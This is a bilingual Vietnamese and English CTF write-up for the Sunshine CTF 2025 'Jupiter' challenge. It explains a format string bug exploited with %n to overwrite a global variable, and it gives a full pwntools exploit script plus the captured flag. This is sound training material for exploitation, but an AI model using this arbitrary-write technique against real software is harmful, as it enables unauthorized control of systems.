# Sunshine CTF 2025 — Jupiter

**Thể loại:** Binary Exploitation (Pwn)

**Độ khó:** Dễ

---

## Tổng quan thử thách

Thử thách cung cấp một tệp thực thi ELF 64-bit tên `jupiter`, hoạt động như một "echo terminal" - lặp lại dữ liệu mà người dùng nhập vào. Nhiệm vụ của người chơi là tìm ra một lỗ hổng trong cơ chế "echo" này để giành quyền kiểm soát và đọc được flag.

---

## Mục tiêu

Mục tiêu chính là khai thác lỗ hổng chuỗi định dạng (Format String Bug) để ghi một giá trị cụ thể vào một biến toàn cục, từ đó kích hoạt một logic ẩn bên trong chương trình để gọi hàm `read_flag`.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức cơ bản về:

- **Phân tích tệp nhị phân:** Sử dụng `file`, `strings`, và `checksec` để thu thập thông tin về kiến trúc và các cơ chế bảo vệ của tệp.
- **Lỗ hổng chuỗi định dạng (Format String):** Hiểu cách các hàm như `printf` hay `dprintf` có thể bị lợi dụng khi chúng xử lý trực tiếp chuỗi đầu vào từ người dùng. Đặc biệt là cách sử dụng định dạng `%n` để thực hiện ghi vào bộ nhớ.
- **Sử dụng trình gỡ lỗi (GDB):** Phân tích mã assembly để hiểu luồng logic, và tìm địa chỉ của các biến toàn cục.
- **Khai thác với Pwntools:** Sử dụng thư viện `pwntools` của Python để tự động hóa việc tìm offset và tạo các payload Format String phức tạp.

---

## Phân tích và hướng tiếp cận

Quá trình giải quyết thử thách này là một cuộc điều tra có hệ thống, đối mặt với các cơ chế bảo vệ khác với bài trước.

1. **Phân tích ban đầu:**
    - Sử dụng `file` và `strings` cho thấy chương trình là một tệp ELF 64-bit không bị stripped, có chứa các chuỗi đáng chú ý như `read_flag`, `secret_key`, và mô tả về "echo terminal".
    - Chạy `checksec --file=./jupiter`. Kết quả là mấu chốt của toàn bộ bài toán:
        - `Canary found`: Có canary bảo vệ stack! Điều này làm cho một cuộc tấn công tràn bộ đệm thông thường (như bài Miami) trở nên gần như bất khả thi nếu không làm rò rỉ được canary.
        - `No PIE`: **Không có PIE!** Đây là một lợi thế cực lớn. Địa chỉ của tất cả các hàm và biến toàn cục (`read_flag`, `secret_key`) là cố định và không thay đổi qua mỗi lần chạy.
2. **Xây dựng giả thuyết:**
    - Sự tồn tại của Canary buộc chúng ta phải tìm một hướng tấn công khác ngoài tràn bộ đệm.
    - Mô tả "echo terminal" và việc chương trình dùng `dprintf` (phát hiện sau này) gợi ý mạnh mẽ đến **Lỗ hổng chuỗi định dạng**.
3. **Phân tích sâu với GDB:**
    - Phân tích hàm `main` (`disas main`) xác nhận giả thuyết. Chúng ta thấy chương trình đọc input bằng `read` với kích thước an toàn (không gây tràn), sau đó in ra bằng `dprintf`. Lỗ hổng nằm ở đây.
    - Quan trọng hơn, chúng ta phát hiện một logic điều kiện tương tự bài Miami:
    Chương trình sẽ gọi `read_flag` nếu biến toàn cục `secret_key` có giá trị là `0x1337c0de`.
        
        ```
        cmp    $0x1337c0de, <secret_key>
        jne    ...
        call   <read_flag>
        
        ```
        
4. **Lên kế hoạch khai thác:**
    - **Mục tiêu:** Ghi giá trị `0x1337c0de` vào địa chỉ của `secret_key`.
    - **Công cụ:** Sử dụng định dạng `%n` trong lỗ hổng Format String để thực hiện ghi vào một địa chỉ tùy ý (Arbitrary Memory Write).
    - **Bước 1: Tìm địa chỉ.** Sử dụng GDB, chúng ta tìm được địa chỉ cố định của `secret_key` là `0x404010`.
    - **Bước 2: Tìm offset.** Chúng ta cần biết `dprintf` phải "nhảy" qua bao nhiêu đối số trên stack 64-bit để đến được nơi bắt đầu payload của chúng ta. Bằng cách gửi một chuỗi `AAAA.%p.%p...`, chúng ta thấy chuỗi `AAAA` xuất hiện ở đối số thứ 5. Vậy **offset là 5**.
    - **Bước 3: Tự động hóa payload.** Việc tạo payload Format String 64-bit để ghi một giá trị 4-byte là rất phức tạp. Chúng ta sử dụng module `fmtstr_payload` của `pwntools` để làm việc này.
    - **Gỡ lỗi:** Lần thử đầu tiên thất bại do server ngắt kết nối. Chúng ta chẩn đoán rằng `pwntools` cần biết bối cảnh (context) của tệp nhị phân để tạo payload cho đúng kiến trúc 64-bit. Bằng cách thêm dòng `context.binary = ELF('./jupiter')`, `pwntools` đã tạo ra payload chính xác.

---

## Kịch bản giải mã (Exploit)

Kịch bản Python cuối cùng sử dụng `pwntools` để tự động hóa toàn bộ quá trình, từ việc tìm địa chỉ đến việc tạo và gửi payload.

```python
# exploit.py
# Tác giả: foqs & Gemini
# Để chạy: python3 exploit.py

from pwn import *

# Offset đã được xác định bằng cách gửi chuỗi '%p' và tìm vị trí của input
offset = 5

# Cung cấp bối cảnh của tệp nhị phân cho pwntools.
# Đây là bước quan trọng để tạo payload đúng cho kiến trúc 64-bit.
context.binary = elf = ELF('./jupiter')

# Tự động lấy địa chỉ của biến mục tiêu từ ELF
secret_key_addr = elf.symbols['secret_key']
value_to_write = 0x1337c0de

# Tạo một dictionary để chỉ định địa chỉ và giá trị cần ghi
writes = {secret_key_addr: value_to_write}

# Pwntools tự động tạo payload Format String phức tạp
payload = fmtstr_payload(offset, writes)

log.info(f"Offset được sử dụng: {offset}")
log.info(f"Địa chỉ secret_key: {hex(secret_key_addr)}")
log.info(f"Payload đã tạo (độ dài {len(payload)}):")
print(payload)

# Kết nối đến server của thử thách
p = remote('chal.sunshinectf.games', 25607)

# Gửi payload sau khi nhận được prompt
p.sendlineafter(b'risk: ', payload)

# Chuyển sang chế độ tương tác để nhận flag
p.interactive()

```

**Kết quả (Flag)**

Khi thực thi kịch bản, payload sẽ ghi đè thành công biến `secret_key`, thỏa mãn điều kiện và chương trình sẽ in ra flag.

`sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}`

---

## Ghi chú và mẹo

- Lỗ hổng chuỗi định dạng là một trong những lỗ hổng mạnh mẽ nhất, cho phép kẻ tấn công không chỉ đọc mà còn **ghi** vào các vị trí bộ nhớ tùy ý.
- Khi đối mặt với Stack Canary, hãy luôn xem xét các loại lỗ hổng khác như Format String, Heap, hoặc các lỗi logic.
- Luôn sử dụng `context.binary = ELF(...)` khi làm việc với `pwntools`. Nó giúp tránh các lỗi tinh vi liên quan đến kiến trúc (32-bit vs 64-bit) và giúp code của bạn sạch sẽ hơn.
- Bài toán này là một ví dụ tuyệt vời về việc kết hợp các thông tin từ `checksec` để định hình chiến lược tấn công: `Canary found` buộc chúng ta từ bỏ buffer overflow, trong khi `No PIE` làm cho việc khai thác Format String trở nên đơn giản hơn rất nhiều.

---

# ENGLISH VERSION

**Category:** Binary Exploitation (Pwn)

**Difficulty:** Easy

---

## Challenge Overview

The challenge provides a 64-bit ELF executable named `jupiter`, which functions as an "echo terminal"—it repeats the data that a user inputs. The player's task is to find a vulnerability in this echo mechanism to gain control and read the flag.

---

## Objective

The main objective is to exploit a Format String Bug to write a specific value to a global variable, thereby triggering a hidden logic within the program to call the `read_flag` function.

---

## Required Knowledge

To solve this challenge, players need a basic understanding of:

- **Binary Analysis:** Using `file`, `strings`, and `checksec` to gather information about the file's architecture and security mitigations.
- **Format String Vulnerabilities:** Understanding how functions like `printf` or `dprintf` can be exploited when they process user-controlled input directly as the format string. Specifically, how to use the `%n` specifier to write to memory.
- **Using a Debugger (GDB):** Analyzing assembly code to understand the program's logic and finding the addresses of global variables.
- **Exploitation with Pwntools:** Using the Python `pwntools` library to automate the process of finding offsets and generating complex Format String payloads.

---

## Analysis and Approach

Solving this challenge was a systematic investigation, dealing with different security mechanisms than the previous challenge.

1. **Initial Reconnaissance:**
    - Using `file` and `strings` revealed the program was a non-stripped 64-bit ELF containing notable strings like `read_flag`, `secret_key`, and the "echo terminal" description.
    - Running `checksec --file=./jupiter` was the turning point of the analysis:
        - `Canary found`: A stack canary was present! This makes a standard buffer overflow attack (like in the Miami challenge) nearly impossible without first leaking the canary.
        - `No PIE`: **No Position-Independent Executable!** This was a massive advantage. The addresses of all functions and global variables (`read_flag`, `secret_key`) are fixed and do not change between runs.
2. **Hypothesis Formulation:**
    - The presence of the Canary forced us to look for an attack vector other than a buffer overflow.
    - The "echo terminal" description and the use of `dprintf` (discovered later) strongly suggested a **Format String Vulnerability**.
3. **In-depth Analysis with GDB:**
    - Disassembling the `main` function (`disas main`) confirmed our hypothesis. We saw the program reads input using `read` with a safe size (preventing an overflow) and then prints it using `dprintf`. The vulnerability was here.
    - More importantly, we discovered a conditional logic similar to the Miami challenge:
    The program calls `read_flag` if the global variable `secret_key` holds the value `0x1337c0de`.
        
        ```
        cmp    $0x1337c0de, <secret_key>
        jne    ...
        call   <read_flag>
        
        ```
        
4. **Exploitation Plan:**
    - **Objective:** Write the value `0x1337c0de` to the address of `secret_key`.
    - **Tool:** Use the `%n` format specifier in the Format String bug to perform an Arbitrary Memory Write.
    - **Step 1: Find the Address.** Using GDB, we found the static address of `secret_key` to be `0x404010`.
    - **Step 2: Find the Offset.** We needed to determine how many arguments on the 64-bit stack `dprintf` had to "skip" to reach the start of our payload. By sending a pattern `AAAA.%p.%p...`, we found our `AAAA` string at the 5th argument. Thus, the **offset is 5**.
    - **Step 3: Automate the Payload.** Crafting a 64-bit format string payload to write a 4-byte value is complex. We used the `fmtstr_payload` module from `pwntools` for this.
    - **Debugging:** The first attempt failed with the server closing the connection. We diagnosed that `pwntools` needed the binary's context to generate a payload for the correct 64-bit architecture. By adding the line `context.binary = ELF('./jupiter')`, `pwntools` generated the correct payload.

---

## Exploit Script

The final Python script uses `pwntools` to automate the entire process, from finding the address to generating and sending the payload.

```python
# exploit.py
# Author: foqs & Gemini
# To run: python3 exploit.py

from pwn import *

# The offset determined by sending a '%p' chain and finding our input's position
offset = 5

# Provide the binary's context to pwntools.
# This is a critical step for generating a correct payload for the 64-bit architecture.
context.binary = elf = ELF('./jupiter')

# Automatically get the target variable's address from the ELF file
secret_key_addr = elf.symbols['secret_key']
value_to_write = 0x1337c0de

# Create a dictionary specifying what address to write what value to
writes = {secret_key_addr: value_to_write}

# Pwntools automatically generates the complex Format String payload
payload = fmtstr_payload(offset, writes)

log.info(f"Using offset: {offset}")
log.info(f"Address of secret_key: {hex(secret_key_addr)}")
log.info(f"Generated payload (length {len(payload)}):")
print(payload)

# Connect to the remote challenge server
p = remote('chal.sunshinectf.games', 25607)

# Send the payload after receiving the prompt
p.sendlineafter(b'risk: ', payload)

# Switch to interactive mode to receive the flag
p.interactive()

```

**Result (Flag)**

When the script is executed, the payload successfully overwrites the `secret_key` variable, satisfies the condition, and the program prints the flag.

`sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}`

---

## Postmortem / Tips

- Format String vulnerabilities are among the most powerful, allowing an attacker not just to read but also to **write** to arbitrary memory locations.
- When faced with a Stack Canary, always consider other vulnerability classes like Format String, Heap, or logic bugs.
- Always use `context.binary = ELF(...)` when working with `pwntools`. It helps avoid subtle architecture-related bugs (32-bit vs. 64-bit) and makes your code cleaner.
- This challenge is a perfect example of how to combine information from `checksec` to form an attack strategy: `Canary found` forced us to abandon buffer overflows, while `No PIE` made the Format String exploitation much more straightforward.
